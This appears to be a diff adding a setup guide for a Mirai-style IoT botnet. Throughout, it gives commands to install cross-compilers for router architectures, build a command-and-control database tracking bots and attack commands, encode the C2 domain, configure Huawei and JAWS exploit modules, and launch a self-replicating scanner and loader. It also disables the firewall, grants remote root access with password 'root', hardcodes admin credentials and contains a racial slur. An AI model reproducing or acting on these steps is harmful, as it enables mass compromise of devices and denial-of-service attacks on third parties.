@@ -1,0 +1,247 @@
+==========================================================
+=MAKE SURE TO DRAG EVERY FILE IN THE FOLDER INTO THE VPS.=
+==========================================================
+
+// Copy paste this code and put it all on your terminal all at once:
+
+yum update -y
+yum install epel-release -y
+yum groupinstall "Development Tools" -y
+yum install gmp-devel -y
+ln -s /usr/lib64/libgmp.so.3  /usr/lib64/libgmp.so.10
+yum install screen nano wget bzip2 gcc gcc-c++ electric-fence sudo xz git libc6-dev httpd xinetd tftpd tftp-server mysql mysql-server gcc glibc-static -y
+
+mkdir /etc/xcompile/
+cd /etc/xcompile/
+wget https://github.com/foss-for-synopsys-dwc-arc-processors/toolchain/releases/download/arc-2017.09-release/arc_gnu_2017.09_prebuilt_uclibc_le_arc700_linux_install.tar.gz --no-check-certificate -c
+wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i586.tar.bz2 --no-check-certificate -c
+wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i686.tar.bz2 --no-check-certificate -c
+wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-m68k.tar.bz2 --no-check-certificate -c
+wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mips.tar.bz2 --no-check-certificate -c
+wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mipsel.tar.bz2 --no-check-certificate -c
+wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-powerpc.tar.bz2 --no-check-certificate -c
+wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sh4.tar.bz2 --no-check-certificate -c
+wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sparc.tar.bz2 --no-check-certificate -c
+wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv4l.tar.bz2 --no-check-certificate -c
+wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv5l.tar.bz2 --no-check-certificate -c
+wget http://distro.ibiblio.org/slitaz/sources/packages/c/cross-compiler-armv6l.tar.bz2 --no-check-certificate -c
+wget https://landley.net/aboriginal/downloads/old/binaries/1.2.6/cross-compiler-armv7l.tar.bz2 --no-check-certificate -c
+tar -xzf arc_gnu_2017.09_prebuilt_uclibc_le_arc700_linux_install.tar.gz
+tar -jxf cross-compiler-i586.tar.bz2
+tar -jxf cross-compiler-i686.tar.bz2
+tar -jxf cross-compiler-m68k.tar.bz2
+tar -jxf cross-compiler-mips.tar.bz2
+tar -jxf cross-compiler-mipsel.tar.bz2
+tar -jxf cross-compiler-powerpc.tar.bz2
+tar -jxf cross-compiler-sh4.tar.bz2
+tar -jxf cross-compiler-sparc.tar.bz2
+tar -jxf cross-compiler-armv4l.tar.bz2
+tar -jxf cross-compiler-armv5l.tar.bz2
+tar -jxf cross-compiler-armv6l.tar.bz2
+tar -jxf cross-compiler-armv7l.tar.bz2
+rm -rf *.tar.bz2
+rm -rf *.tar.gz
+mv arc_gnu_2017.09_prebuilt_uclibc_le_arc700_linux_install arc
+mv cross-compiler-i586 i586
+mv cross-compiler-i686 i686
+mv cross-compiler-m68k m68k
+mv cross-compiler-mips mips
+mv cross-compiler-mipsel mipsel
+mv cross-compiler-powerpc powerpc
+mv cross-compiler-sh4 sh4
+mv cross-compiler-sparc sparc
+mv cross-compiler-armv4l armv4l
+mv cross-compiler-armv5l armv5l
+mv cross-compiler-armv6l armv6l
+mv cross-compiler-armv7l armv7l
+
+cd /tmp
+wget https://dl.google.com/go/go1.13.linux-amd64.tar.gz -q --no-check-certificate -c
+tar -xzf go1.13.linux-amd64.tar.gz
+mv go /usr/local
+export GOROOT=/usr/local/go
+export GOPATH=$HOME/Projects/Proj1
+export PATH=$GOPATH/bin:$GOROOT/bin:$PATH
+go version
+go env
+cd ~/
+
+
+==========================================================
+==========================================================
+
+
+// Now after that we have to setup the bot.
+// Change the other ips with your server IP.
+// We will setup the database, run these commands on your terminal:
+==========================================================
+==========================================================
+
+service mysqld start
+mysql_secure_installation
+
+yum install mariadb-server
+systemctl start mariadb.service
+
+
+rpm -Uvh https://dl.fedoraproject.org/pub/epel/epel-release-latest-6.noarch.rpm
+rpm -Uvh http://rpms.famillecollet.com/enterprise/remi-release-6.rpm
+
+nano /etc/yum.repos.d/remi.repo
+
+yum -y update mysql*
+
+skip this nigga
+==========================================================
+==========================================================
+
+// Now Login with your mysql pass by running this command:
+
+==========================================================
+==========================================================
+mysql -u root -p
+==========================================================
+==========================================================
+
+// Now we will add the database, copy and paste this on your terminal:
+
+==========================================================
+==========================================================
+use mysql
+GRANT ALL ON *.* to root@'%' IDENTIFIED BY 'root';
+FLUSH PRIVILEGES;
+
+create database gang;
+use gang;
+
+CREATE TABLE `history` (
+  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
+  `user_id` int(10) unsigned NOT NULL,
+  `time_sent` int(10) unsigned NOT NULL,
+  `duration` int(10) unsigned NOT NULL,
+  `command` text NOT NULL,
+  `max_bots` int(11) DEFAULT '-1',
+  PRIMARY KEY (`id`),
+  KEY `user_id` (`user_id`)
+);
+ 
+CREATE TABLE `users` (
+  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
+  `username` varchar(32) NOT NULL,
+  `password` varchar(32) NOT NULL,
+  `duration_limit` int(10) unsigned DEFAULT NULL,
+  `cooldown` int(10) unsigned NOT NULL,
+  `wrc` int(10) unsigned DEFAULT NULL,
+  `last_paid` int(10) unsigned NOT NULL,
+  `max_bots` int(11) DEFAULT '-1',
+  `admin` int(10) unsigned DEFAULT '0',
+  `intvl` int(10) unsigned DEFAULT '30',
+  `api_key` text,
+  PRIMARY KEY (`id`),
+  KEY `username` (`username`)
+);
+ 
+CREATE TABLE `whitelist` (
+  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
+  `prefix` varchar(16) DEFAULT NULL,
+  `netmask` tinyint(3) unsigned DEFAULT NULL,
+  PRIMARY KEY (`id`),
+  KEY `prefix` (`prefix`)
+);
+INSERT INTO users VALUES (NULL, 'gudfelaz', '13121312', 0, 0, 0, 0, -1, 1, 30, '');
+INSERT INTO users VALUES (NULL, 'TAHoro', 'CuTERYpEsHOB', 0, 0, 0, 0, -1, 1, 30, '');
+exit;
+
+-----------------------------------------------------------------------------------
+
+##########################################################################
+ CHANGE TABLE KEY IN ENC.C TO YOURS I DID IT ALREADY SO NO WORRIES
+##########################################################################
+first point your domain to ip: example subdomain.domain.name
+cd enc
+yum install gcc
+gcc enc.c -o enc
+./enc string "subdomain.domain.name"
+Go to table.c and replace TABLE_CNC_DOMAIN, TABLE_SCAN_DOMAIN with the string it output
+###############################################################################################
+
+
+
+go to huawei.c and jaws.c
+search for subdomain.domain and replace it with your domain.
+
+Good luck mate! ly <3
+
+==========================================================
+==========================================================
+
+==========================================================
+
+iptables -F; service iptables stop; service httpd restart; service mysqld restart; ulimit -n999999; ulimit -u999999; ulimit -e999999
+
+
+nano /usr/include/bits/typesizes.h
+scroll down and edit the 1024 to 999999
+==========================================================
+
+// Alright, we have to compile the bot and screen the cnc server by doing this:
+
+==========================================================
+
+cd ~/
+chmod 777 * -R
+sh build.sh
+
+
+
+python payload.py
+
+
+ulimit -n999999; ulimit -u999999; ulimit -e999999
+screen ./cnc
+
+==========================================================
+PHPMYADMIN
+==========================================================
+yum update -y; yum install httpd php wget nano -y; service iptables stop; chkconfig iptables off
+sudo yum install epel-release -y
+yum update
+yum install httpd mysql-server php  -y
+service mysql start
+yum install php
+yum install phpmyadmin -y
+
+
+sed -i 's/127.0.0.1/88.99.171.136/g' /etc/httpd/conf.d/phpMyAdmin.conf
+
+service httpd restart
+ ---
+
+
+Ctrl A + D for detach
+
+screen ./run.sh 
+
+screen ./scanListen | ./loader selfrep for Selfrep
+
+port 59666 or 56999 check main.go
+ 
+ enjoy :)
+
+
+
+==========================================================
+FIXES
+==========================================================
+
+if it says mysql driver.connector undeclared or anything in that way:
+
+rm -rf /usr/local/go
+wget https://dl.google.com/go/go1.10.3.linux-amd64.tar.gz
+sha256sum go1.10.3.linux-amd64.tar.gz
+sudo tar -C /usr/local -xzf go1.10.3.linux-amd64.tar.gz
+export PATH=$PATH:/usr/local/go/bin
+source ~/.bash_profile
+
+
+
